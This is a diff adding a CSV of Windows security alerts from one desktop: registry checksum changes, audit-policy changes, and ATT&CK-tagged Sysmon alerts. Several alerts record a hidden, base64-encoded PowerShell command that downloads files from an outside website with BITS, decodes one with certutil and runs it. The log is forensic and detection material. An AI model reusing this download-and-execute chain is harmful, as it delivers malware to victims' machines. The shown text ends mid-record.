@@ -1,0 +1,183 @@
+timestamp,"rule.level","rule.description","data.win.system.message","data.win.eventdata.commandLine","full_log"
+"May 23, 2020 @ 13:47:50.035",7,"Integrity checksum changed.",,,"File '[x64] HKEY_LOCAL_MACHINE\Software\Microsoft\Active Setup\Installed Components\{8A69D345-D564-463c-AFF1-A69D9E530F96}' checksum changed.
+Old md5sum was: '271f59daf9ca28fbeb0bd234897e1662'
+New md5sum is : '7b0e21ee99623454e8d06871f064ed98'
+Old sha1sum was: 'e8d6ecabf76ed97cd87dc8593f64cd69ec8ec7a2'
+New sha1sum is : 'f63735bbc2e72216030f4e994b7c9785856a9170'
+"
+"May 23, 2020 @ 13:47:48.878",7,"Integrity checksum changed.",,,"File '[x64] HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon' checksum changed.
+Old md5sum was: '496e80acc19637c8daf8c286b6ea10f0'
+New md5sum is : '4cea2c835f70071dc02ed62b073dfba8'
+Old sha1sum was: '88ef9e17f6f18f6242bf8a46b383b017d42012b9'
+New sha1sum is : '77e72a40def388a760e7dd5d34aee517e6c01817'
+"
+"May 23, 2020 @ 13:47:48.862",7,"Integrity checksum changed.",,,"File '[x64] HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey\1\S-1-5-21-438079597-2123118846-2669748851-1001' checksum changed.
+Old md5sum was: '89598d32459256342f73e9b832b618dc'
+New md5sum is : 'f09b8f706fbbdc831b56268167855de8'
+Old sha1sum was: '68aacf23a86d664018607a7fc5d1379269af8643'
+New sha1sum is : '765494a3d04df5b143fa79ecd655484a9d80378a'
+"
+"May 23, 2020 @ 13:46:42.124",7,"Integrity checksum changed.",,,"File 'HKEY_LOCAL_MACHINE\Security\SAM' checksum changed.
+Old md5sum was: 'd41d8cd98f00b204e9800998ecf8427e'
+New md5sum is : '85a6f1b1286ecf20e01235e2d33ec25a'
+Old sha1sum was: 'da39a3ee5e6b4b0d3255bfef95601890afd80709'
+New sha1sum is : 'dc139d9e9ad39ee0dadd9b4f52db078581cfb394'
+"
+"May 23, 2020 @ 13:46:42.065",7,"Integrity checksum changed.",,,"File 'HKEY_LOCAL_MACHINE\Security\SAM\Domains' checksum changed.
+Old md5sum was: 'd41d8cd98f00b204e9800998ecf8427e'
+New md5sum is : '611308539b0b432c267cdad008c8d152'
+Old sha1sum was: 'da39a3ee5e6b4b0d3255bfef95601890afd80709'
+New sha1sum is : '946019a260c9ac9732156f3dfde8ab1a02093bbd'
+"
+"May 23, 2020 @ 13:46:42.048",7,"Integrity checksum changed.",,,"File 'HKEY_LOCAL_MACHINE\Security\SAM\Domains\Builtin' checksum changed.
+Old md5sum was: 'd41d8cd98f00b204e9800998ecf8427e'
+New md5sum is : 'aa153037b39970a484b4832b0ffe8501'
+Old sha1sum was: 'da39a3ee5e6b4b0d3255bfef95601890afd80709'
+New sha1sum is : '18145d2068766fb817f5dc40a5c023c4b7d7cb8d'
+"
+"May 23, 2020 @ 13:46:41.975",7,"Integrity checksum changed.",,,"File 'HKEY_LOCAL_MACHINE\Security\SAM\Domains\Builtin\Aliases' checksum changed.
+Old md5sum was: 'd41d8cd98f00b204e9800998ecf8427e'
+New md5sum is : '611308539b0b432c267cdad008c8d152'
+Old sha1sum was: 'da39a3ee5e6b4b0d3255bfef95601890afd80709'
+New sha1sum is : '946019a260c9ac9732156f3dfde8ab1a02093bbd'
+"
+"May 23, 2020 @ 13:46:41.641",7,"Integrity checksum changed.",,,"File 'HKEY_LOCAL_MACHINE\Security\SAM\Domains\Builtin\Aliases\Members' checksum changed.
+Old md5sum was: 'd41d8cd98f00b204e9800998ecf8427e'
+New md5sum is : '611308539b0b432c267cdad008c8d152'
+Old sha1sum was: 'da39a3ee5e6b4b0d3255bfef95601890afd80709'
+New sha1sum is : '946019a260c9ac9732156f3dfde8ab1a02093bbd'
+"
+"May 23, 2020 @ 13:46:41.604",7,"Integrity checksum changed.",,,"File 'HKEY_LOCAL_MACHINE\Security\SAM\Domains\Builtin\Aliases\Members\S-1-5-21-438079597-2123118846-2669748851' checksum changed.
+Old md5sum was: 'd41d8cd98f00b204e9800998ecf8427e'
+New md5sum is : '708111ebe998051bf46012611efd58c7'
+Old sha1sum was: 'da39a3ee5e6b4b0d3255bfef95601890afd80709'
+New sha1sum is : '87407fbef078448a88fc7baf977bb2cc979eb369'
+"
+"May 23, 2020 @ 13:46:16.839",9,"Benchmark for Windows audit: Ensure 'MSS: (AutoAdminLogon) Enable Automatic Logon (not recommended)' is set to 'Disabled': Status changed from 'not applicable' to failed",,,
+"May 23, 2020 @ 13:46:09.098",7,"SessionEnv was unavailable to handle a critical notification event","""The winlogon notification subscriber <SessionEnv> was unavailable to handle a critical notification event.""",,
+"May 23, 2020 @ 13:44:39.392",7,"Integrity checksum changed.",,,"File 'HKEY_LOCAL_MACHINE\Security\SAM' checksum changed.
+Old md5sum was: '85a6f1b1286ecf20e01235e2d33ec25a'
+New md5sum is : 'd41d8cd98f00b204e9800998ecf8427e'
+Old sha1sum was: 'dc139d9e9ad39ee0dadd9b4f52db078581cfb394'
+New sha1sum is : 'da39a3ee5e6b4b0d3255bfef95601890afd80709'
+"
+"May 23, 2020 @ 13:44:39.374",7,"Integrity checksum changed.",,,"File 'HKEY_LOCAL_MACHINE\Security\SAM\Domains' checksum changed.
+Old md5sum was: '611308539b0b432c267cdad008c8d152'
+New md5sum is : 'd41d8cd98f00b204e9800998ecf8427e'
+Old sha1sum was: '946019a260c9ac9732156f3dfde8ab1a02093bbd'
+New sha1sum is : 'da39a3ee5e6b4b0d3255bfef95601890afd80709'
+"
+"May 23, 2020 @ 13:44:39.370",7,"Integrity checksum changed.",,,"File 'HKEY_LOCAL_MACHINE\Security\SAM\Domains\Builtin' checksum changed.
+Old md5sum was: 'aa153037b39970a484b4832b0ffe8501'
+New md5sum is : 'd41d8cd98f00b204e9800998ecf8427e'
+Old sha1sum was: '18145d2068766fb817f5dc40a5c023c4b7d7cb8d'
+New sha1sum is : 'da39a3ee5e6b4b0d3255bfef95601890afd80709'
+"
+"May 23, 2020 @ 13:44:39.359",7,"Integrity checksum changed.",,,"File 'HKEY_LOCAL_MACHINE\Security\SAM\Domains\Builtin\Aliases' checksum changed.
+Old md5sum was: '611308539b0b432c267cdad008c8d152'
+New md5sum is : 'd41d8cd98f00b204e9800998ecf8427e'
+Old sha1sum was: '946019a260c9ac9732156f3dfde8ab1a02093bbd'
+New sha1sum is : 'da39a3ee5e6b4b0d3255bfef95601890afd80709'
+"
+"May 23, 2020 @ 13:44:39.333",7,"Integrity checksum changed.",,,"File 'HKEY_LOCAL_MACHINE\Security\SAM\Domains\Builtin\Aliases\Members' checksum changed.
+Old md5sum was: '611308539b0b432c267cdad008c8d152'
+New md5sum is : 'd41d8cd98f00b204e9800998ecf8427e'
+Old sha1sum was: '946019a260c9ac9732156f3dfde8ab1a02093bbd'
+New sha1sum is : 'da39a3ee5e6b4b0d3255bfef95601890afd80709'
+"
+"May 23, 2020 @ 13:44:39.312",7,"Integrity checksum changed.",,,"File 'HKEY_LOCAL_MACHINE\Security\SAM\Domains\Builtin\Aliases\Members\S-1-5-21-438079597-2123118846-2669748851' checksum changed.
+Old md5sum was: '708111ebe998051bf46012611efd58c7'
+New md5sum is : 'd41d8cd98f00b204e9800998ecf8427e'
+Old sha1sum was: '87407fbef078448a88fc7baf977bb2cc979eb369'
+New sha1sum is : 'da39a3ee5e6b4b0d3255bfef95601890afd80709'
+"
+"May 23, 2020 @ 13:39:30.424",7,"Integrity checksum changed.",,,"File 'HKEY_LOCAL_MACHINE\Security\Policy\PolAdtEv' checksum changed.
+Old md5sum was: '9d15aff4d26f802c3c4d3d74a00d8d4d'
+New md5sum is : 'b40de87500ee3eed90c2ce3ce8c7946f'
+Old sha1sum was: '11f3afa3902d0fadfcc52e4c051995f536c7d4e2'
+New sha1sum is : '2f6e6dd0efd148b1c11d33c91e9cea4a97a84792'
+"
+"May 23, 2020 @ 13:38:13.251",8,"Windows Audit Policy changed","""System audit policy was changed.
+
+Subject:
+	Security ID:		S-1-5-18
+	Account Name:		DESKTOP-HUE026H$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Audit Policy Change:
+	Category:		Object Access
+	Subcategory:		Handle Manipulation
+	Subcategory GUID:	{0cce9223-69ae-11d9-bed3-505054503030}
+	Changes:		Success Added""",,
+"May 23, 2020 @ 13:38:13.157",8,"Windows Audit Policy changed","""System audit policy was changed.
+
+Subject:
+	Security ID:		S-1-5-18
+	Account Name:		DESKTOP-HUE026H$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Audit Policy Change:
+	Category:		Object Access
+	Subcategory:		File System
+	Subcategory GUID:	{0cce921d-69ae-11d9-bed3-505054503030}
+	Changes:		Success Added""",,
+"May 23, 2020 @ 13:38:05.891",7,"Integrity checksum changed.",,,"File '[x64] HKEY_LOCAL_MACHINE\Software\Microsoft\Active Setup\Installed Components\{8A69D345-D564-463c-AFF1-A69D9E530F96}' checksum changed.
+Old md5sum was: '7fa7290c3b0e7b2d8ed5a092299db356'
+New md5sum is : '271f59daf9ca28fbeb0bd234897e1662'
+Old sha1sum was: '27735fff26a4f9093576dfbd77d06599094d3497'
+New sha1sum is : 'e8d6ecabf76ed97cd87dc8593f64cd69ec8ec7a2'
+"
+"May 23, 2020 @ 13:37:59.985",7,"Integrity checksum changed.",,,"File '[x64] HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_USE_WINDOWEDSELECTCONTROL' checksum changed.
+Old md5sum was: '370914f65a755a1cbfcf0c873b11feaa'
+New md5sum is : '1c729912f87f9abbd1574176fc5996f7'
+Old sha1sum was: 'ea4c2f8e1a1dc5de73a98dbadb5abff9297c9a4b'
+New sha1sum is : '1d2094dc263dc3db258f4421536e179cfbd9cfb0'
+"
+"May 23, 2020 @ 13:37:42.866",14,"ATT&CK T1064: Windows Shell Spawning Suspicious Program","""Process Create:
+RuleName: 
+UtcTime: 2020-05-22 13:18:27.845
+ProcessGuid: {df9fc3d3-d123-5ec7-0000-00107aa91300}
+ProcessId: 6856
+Image: C:\Windows\System32\certutil.exe
+FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
+Description: CertUtil.exe
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: CertUtil.exe
+CommandLine: ""C:\Windows\system32\certutil.exe"" -decode xtd42 y29x3
+CurrentDirectory: C:\Users\John Williams\AppData\Local\Temp\
+User: DESKTOP-HUE026H\John Williams
+LogonGuid: {df9fc3d3-d0d4-5ec7-0000-002021020300}
+LogonId: 0x30221
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: MD5=DE9C75F34F47B60A71BBA03760F0579E,SHA256=12F06D3B1601004DB3F7F1A07E7D3AF4CC838E890E0FF50C51E4A0C9366719ED,IMPHASH=336674CB3C8337BDE2C22255345BFF43
+ParentProcessGuid: {df9fc3d3-d121-5ec7-0000-0010716f1300}
+ParentProcessId: 6560
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: powershell -windowstyle hidden -en SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAEIAaQB0AHMAVAByAGEAbgBzAGYAZQByADsAIABTAHQAYQByAHQALQBCAGkAdABzAFQAcgBhAG4AcwBmAGUAcgAgAC0AUwBvAHUAcgBjAGUAIABoAHQAdABwADoALwAvAHMAaABvAHcAMgAuAHcAZQBiAHMAaQB0AGUALwBnAGUAWgBqAFMALgBkAGEAdAAsAGgAdAB0AHAAOgAvAC8AcwBoAG8AdwAyAC4AdwBlAGIAcwBpAHQAZQAvAG4ATQBiAGQALgBkAGEAdAAsAGgAdAB0AHAAOgAvAC8AcwBoAG8AdwAyAC4AdwBlAGIAcwBpAHQAZQAvAGEAYwBQAE0AUQAuAGQAYQB0ACAALQBEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAdABrAG8AbABkAC4AYwBvAG0AIgAsACIAJABlAG4AdgA6AFQARQBNAFAAXAB4AHQAZAA0ADIAIgAsACIAJABlAG4AdgA6AFQARQBNAFAAXABhAGMAUABNAFEALgBjAG8AbQAiADsAIABTAGUAdAAtAEwAbwBjAGEAdABpAG8AbgAgAC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAIgA7ACAAYwBlAHIAdAB1AHQAaQBsACAALQBkAGUAYwBvAGQAZQAgAHgAdABkADQAMgAgAHkAMgA5AHgAMwA7ACAAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAdABrAG8AbABkACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgAHkAMgA5AHgAMwA=""","\""C:\\Windows\\system32\\certutil.exe\"" -decode xtd42 y29x3","{""win"":{""system"":{""providerName"":""Microsoft-Windows-Sysmon"",""providerGuid"":""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"",""eventID"":""1"",""version"":""5"",""level"":""4"",""task"":""1"",""opcode"":""0"",""keywords"":""0x8000000000000000"",""systemTime"":""2020-05-22T13:18:27.894942900Z"",""eventRecordID"":""912"",""processID"":""2292"",""threadID"":""3260"",""channel"":""Microsoft-Windows-Sysmon/Operational"",""computer"":""DESKTOP-HUE026H"",""severityValue"":""INFORMATION"",""message"":""\""Process Create:\r\nRuleName: \r\nUtcTime: 2020-05-22 13:18:27.845\r\nProcessGuid: {df9fc3d3-d123-5ec7-0000-00107aa91300}\r\nProcessId: 6856\r\nImage: C:\\Windows\\System32\\certutil.exe\r\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\r\nDescription: CertUtil.exe\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: CertUtil.exe\r\nCommandLine: \""C:\\Windows\\system32\\certutil.exe\"" -decode xtd42 y29x3\r\nCurrentDirectory: C:\\Users\\John Williams\\AppData\\Local\\Temp\\\r\nUser: DESKTOP-HUE026H\\John Williams\r\nLogonGuid: {df9fc3d3-d0d4-5ec7-0000-002021020300}\r\nLogonId: 0x30221\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: MD5=DE9C75F34F47B60A71BBA03760F0579E,SHA256=12F06D3B1601004DB3F7F1A07E7D3AF4CC838E890E0FF50C51E4A0C9366719ED,IMPHASH=336674CB3C8337BDE2C22255345BFF43\r\nParentProcessGuid: {df9fc3d3-d121-5ec7-0000-0010716f1300}\r\nParentProcessId: 6560\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: powershell -windowstyle hidden -en SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAEIAaQB0AHMAVAByAGEAbgBzAGYAZQByADsAIABTAHQAYQByAHQALQBCAGkAdABzAFQAcgBhAG4AcwBmAGUAcgAgAC0AUwBvAHUAcgBjAGUAIABoAHQAdABwADoALwAvAHMAaABvAHcAMgAuAHcAZQBiAHMAaQB0AGUALwBnAGUAWgBqAFMALgBkAGEAdAAsAGgAdAB0AHAAOgAvAC8AcwBoAG8AdwAyAC4AdwBlAGIAcwBpAHQAZQAvAG4ATQBiAGQALgBkAGEAdAAsAGgAdAB0AHAAOgAvAC8AcwBoAG8AdwAyAC4AdwBlAGIAcwBpAHQAZQAvAGEAYwBQAE0AUQAuAGQAYQB0ACAALQBEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAdABrAG8AbABkAC4AYwBvAG0AIgAsACIAJABlAG4AdgA6AFQARQBNAFAAXAB4AHQAZAA0ADIAIgAsACIAJABlAG4AdgA6AFQARQBNAFAAXABhAGMAUABNAFEALgBjAG8AbQAiADsAIABTAGUAdAAtAEwAbwBjAGEAdABpAG8AbgAgAC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAIgA7ACAAYwBlAHIAdAB1AHQAaQBsACAALQBkAGUAYwBvAGQAZQAgAHgAdABkADQAMgAgAHkAMgA5AHgAMwA7ACAAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAdABrAG8AbABkACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgAHkAMgA5AHgAMwA=\""""},""eventdata"":{""utcTime"":""2020-05-22 13:18:27.845"",""processGuid"":""{df9fc3d3-d123-5ec7-0000-00107aa91300}"",""processId"":""6856"",""image"":""C:\\\\Windows\\\\System32\\\\certutil.exe"",""fileVersion"":""10.0.18362.1 (WinBuild.160101.0800)"",""description"":""CertUtil.exe"",""product"":""Microsoft® Windows® Operating System"",""company"":""Microsoft Corporation"",""originalFileName"":""CertUtil.exe"",""commandLine"":""\\\""C:\\\\Windows\\\\system32\\\\certutil.exe\\\"" -decode xtd42 y29x3"",""currentDirectory"":""C:\\\\Users\\\\John Williams\\\\AppData\\\\Local\\\\Temp\\\\"",""user"":""DESKTOP-HUE026H\\\\John Williams"",""logonGuid"":""{df9fc3d3-d0d4-5ec7-0000-002021020300}"",""logonId"":""0x30221"",""terminalSessionId"":""1"",""integrityLevel"":""Medium"",""hashes"":""MD5=DE9C75F34F47B60A71BBA03760F0579E,SHA256=12F06D3B1601004DB3F7F1A07E7D3AF4CC838E890E0FF50C51E4A0C9366719ED,IMPHASH=336674CB3C8337BDE2C22255345BFF43"",""parentProcessGuid"":""{df9fc3d3-d121-5ec7-0000-0010716f1300}"",""parentProcessId"":""6560"",""parentImage"":""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"",""parentCommandLine"":""powershell -windowstyle hidden -en SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAEIAaQB0AHMAVAByAGEAbgBzAGYAZQByADsAIABTAHQAYQByAHQALQBCAGkAdABzAFQAcgBhAG4AcwBmAGUAcgAgAC0AUwBvAHUAcgBjAGUAIABoAHQAdABwADoALwAvAHMAaABvAHcAMgAuAHcAZQBiAHMAaQB0AGUALwBnAGUAWgBqAFMALgBkAGEAdAAsAGgAdAB0AHAAOgAvAC8AcwBoAG8AdwAyAC4AdwBlAGIAcwBpAHQAZQAvAG4ATQBiAGQALgBkAGEAdAAsAGgAdAB0AHAAOgAvAC8AcwBoAG8AdwAyAC4AdwBlAGIAcwBpAHQAZQAvAGEAYwBQAE0AUQAuAGQAYQB0ACAALQBEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAdABrAG8AbABkAC4AYwBvAG0AIgAsACIAJABlAG4AdgA6AFQARQBNAFAAXAB4AHQAZAA0ADIAIgAsACIAJABlAG4AdgA6AFQARQBNAFAAXABhAGMAUABNAFEALgBjAG8AbQAiADsAIABTAGUAdAAtAEwAbwBjAGEAdABpAG8AbgAgAC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAIgA7ACAAYwBlAHIAdAB1AHQAaQBsACAALQBkAGUAYwBvAGQAZQAgAHgAdABkADQAMgAgAHkAMgA5AHgAMwA7ACAAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAdABrAG8AbABkACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgAHkAMgA5AHgAMwA=""}}}"
+"May 23, 2020 @ 13:37:40.225",15,"ATT&CK T1047: Wmiprvse Spawning Process","""Process Create:
+RuleName: 
+UtcTime: 2020-05-22 13:18:25.253
+ProcessGuid: {df9fc3d3-d121-5ec7-0000-0010716f1300}
+ProcessId: 6560
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell -windowstyle hidden -en SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAEIAaQB0AHMAVAByAGEAbgBzAGYAZQByADsAIABTAHQAYQByAHQALQBCAGkAdABzAFQAcgBhAG4AcwBmAGUAcgAgAC0AUwBvAHUAcgBjAGUAIABoAHQAdABwADoALwAvAHMAaABvAHcAMgAuAHcAZQBiAHMAaQB0AGUALwBnAGUAWgBqAFMALgBkAGEAdAAsAGgAdAB0AHAAOgAvAC8AcwBoAG8AdwAyAC4AdwBlAGIAcwBpAHQAZQAvAG4ATQBiAGQALgBkAGEAdAAsAGgAdAB0AHAAOgAvAC8AcwBoAG8AdwAyAC4AdwBlAGIAcwBpAHQAZQAvAGEAYwBQAE0AUQAuAGQAYQB0ACAALQBEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAdABrAG8AbABkAC4AYwBvAG0AIgAsACIAJABlAG4AdgA6AFQARQBNAFAAXAB4AHQAZAA0ADIAIgAsACIAJABlAG4AdgA6AFQARQBNAFAAXABhAGMAUABNAFEALgBjAG8AbQAiADsAIABTAGUAdAAtAEwAbwBjAGEAdABpAG8AbgAgAC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAIgA7ACAAYwBlAHIAdAB1AHQAaQBsACAALQBkAGUAYwBvAGQAZQAgAHgAdABkADQAMgAgAHkAMgA5AHgAMwA7ACAAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAdABrAG8AbABkACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgAHkAMgA5AHgAMwA=
+CurrentDirectory: C:\Windows\system32\
+User: DESKTOP-HUE026H\John Williams
+LogonGuid: {df9fc3d3-d0d4-5ec7-0000-002021020300}
+LogonId: 0x30221
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481
+ParentProcessGuid: {df9fc3d3-d0e3-5ec7-0000-00107c1d0700}
+ParentProcessId: 5700
+ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
+ParentCommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding""","powershell -windowstyle hidden -en SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAEIAaQB0AHMAVAByAGEAbgBzAGYAZQByADsAIABTAHQAYQByAHQALQBCAGkAdABzAFQAcgBhAG4AcwBmAGUAcgAgAC0AUwBvAHUAcgBjAGUAIABoAHQAdABwADoALwAvAHMAaABvAHcAMgAuAHcAZQBiAHMAaQB0AGUALwBnAGUAWgBqAFMALgBkAGEAdAAsAGgAdAB0AHAAOgAvAC8AcwBoAG8AdwAyAC4AdwBlAGIAcwBpAHQAZQAvAG4ATQBiAGQALgBkAGEAdAAsAGgAdAB0AHAAOgAvAC8AcwBoAG8AdwAyAC4AdwBlAGIAcwBpAHQAZQAvAGEAYwBQAE0AUQAuAGQAYQB0ACAALQBEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAdABrAG8AbABkAC4AYwBvAG0AIgAsACIAJABlAG4AdgA6AFQARQBNAFAAXAB4AHQAZAA0ADIAIgAsACIAJABlAG4AdgA6AFQARQBNAFAAXABhAGMAUABNAFEALgBjAG8AbQAiADsAIABTAGUAdAAtAEwAbwBjAGEAdABpAG8AbgAgAC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAIgA7ACAAYwBlAHIAdAB1AHQAaQBsACAALQBkAGUAYwBvAGQAZQAgAHgAdABkADQAMgAgAHkAMgA5AHgAMwA7ACAAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAdABrAG8AbABkACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgAHkAMgA5AHgAMwA=","{""win"":{""system"":{""providerName"":""Microsoft-Windows-Sysmon"",""providerGuid"":""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"",""eventID"":""1"",""version"":""5"",""level"":""4"",""task"":""1"",""opcode"":""0"",""keywords"":""0x8000000000000000"",""systemTime"":""2020-05-22T13:18:25.263709300Z"",""eventRecordID"":""909"",""processID"":""2292"",""threadID"":""3260"",""channel"":""Microsoft-Windows-Sysmon/Operational"",""computer"":""DESKTOP-HUE026H"",""severityValue"":""INFORMATION"",""message"":""\""Process Create:\r\nRuleName: \r\nUtcTime: 2020-05-22 13:18:25.253\r\nProcessGuid: {df9fc3d3-d121-5ec7-0000-0010716f1300}\r\nProcessId: 6560\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: powershell -windowstyle hidden -en SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAEIAaQB0AHMAVAByAGEAbgBzAGYAZQByADsAIABTAHQAYQByAHQALQBCAGkAdABzAFQAcgBhAG4AcwBmAGUAcgAgAC0AUwBvAHUAcgBjAGUAIABoAHQAdABwADoALwAvAHMAaABvAHcAMgAuAHcAZQBiAHMAaQB0AGUALwBnAGUAWgBqAFMALgBkAGEAdAAsAGgAdAB0AHAAOgAvAC8AcwBoAG8AdwAyAC4AdwBlAGIAcwBpAHQAZQAvAG4ATQBiAGQALgBkAGEAdAAsAGgAdAB0AHAAOgAvAC8AcwBoAG8AdwAyAC4AdwBlAGIAcwBpAHQAZQAvAGEAYwBQAE0AUQAuAGQAYQB0ACAALQBEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAdABrAG8AbABkAC4AYwBvAG0AIgAsACIAJABlAG4AdgA6AFQARQBNAFAAXAB4AHQAZAA0ADIAIgAsACIAJABlAG4AdgA6AFQARQBNAFAAXABhAGMAUABNAFEALgBjAG8AbQAiADsAIABTAGUAdAAtAEwAbwBjAGEAdABpAG8AbgAgAC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAIgA7ACAAYwBlAHIAdAB1AHQAaQBsACAALQBkAGUAYwBvAGQAZQAgAHgAdABkADQAMgAgAHkAMgA5AHgAMwA7ACAAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAdABrAG8AbABkACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgAHkAMgA5AHgAMwA=\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-HUE026H\\John Williams\r\nLogonGuid: {df9fc3d3-d0d4-5ec7-0000-002021020300}\r\nLogonId: 0x30221\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481\r\nParentProcessGuid: {df9fc3d3-d0e3-5ec7-0000-00107c1d0700}\r\nParentProcessId: 5700\r\nParentImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\r\nParentCommandLine: C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding\""""},""eventdata"":{""utcTime"":""2020-05-22 13:18:25.253"",""processGuid"":""{df9fc3d3-d121-5ec7-0000-0010716f1300}"",""processId"":""6560"",""image"":""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"",""fileVersion"":""10.0.18362.1 (WinBuild.160101.0800)"",""description"":""Windows PowerShell"",""product"":""Microsoft® Windows® Operating System"",""company"":""Microsoft Corporation"",""originalFileName"":""PowerShell.EXE"",""commandLine"":""powershell -windowstyle hidden -en SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAEIAaQB0AHMAVAByAGEAbgBzAGYAZQByADsAIABTAHQAYQByAHQALQBCAGkAdABzAFQAcgBhAG4AcwBmAGUAcgAgAC0AUwBvAHUAcgBjAGUAIABoAHQAdABwADoALwAvAHMAaABvAHcAMgAuAHcAZQBiAHMAaQB0AGUALwBnAGUAWgBqAFMALgBkAGEAdAAsAGgAdAB0AHAAOgAvAC8AcwBoAG8AdwAyAC4AdwBlAGIAcwBpAHQAZQAvAG4ATQBiAGQALgBkAGEAdAAsAGgAdAB0AHAAOgAvAC8AcwBoAG8AdwAyAC4AdwBlAGIAcwBpAHQAZQAvAGEAYwBQAE0AUQAuAGQAYQB0ACAALQBEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAdABrAG8AbABkAC4AYwBvAG0AIgAsACIAJABlAG4AdgA6AFQARQBNAFAAXAB4AHQAZAA0ADIAIgAsACIAJABlAG4AdgA6AFQARQBNAFAAXABhAGMAUABNAFEALgBjAG8AbQAiADsAIABTAGUAdAAtAEwAbwBjAGEAdABpAG8AbgAgAC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAIgA7ACAAYwBlAHIAdAB1AHQAaQBsACAALQBkAGUAYwBvAGQAZQAgAHgAdABkADQAMgAgAHkAMgA5AHgAMwA7ACAAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAdABrAG8AbABkACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgAHkAMgA5AHgAMwA="",""currentDirectory"":""C:\\\\Windows\\\\system32\\\\"",""user"":""DESKTOP-HUE026H\\\\John 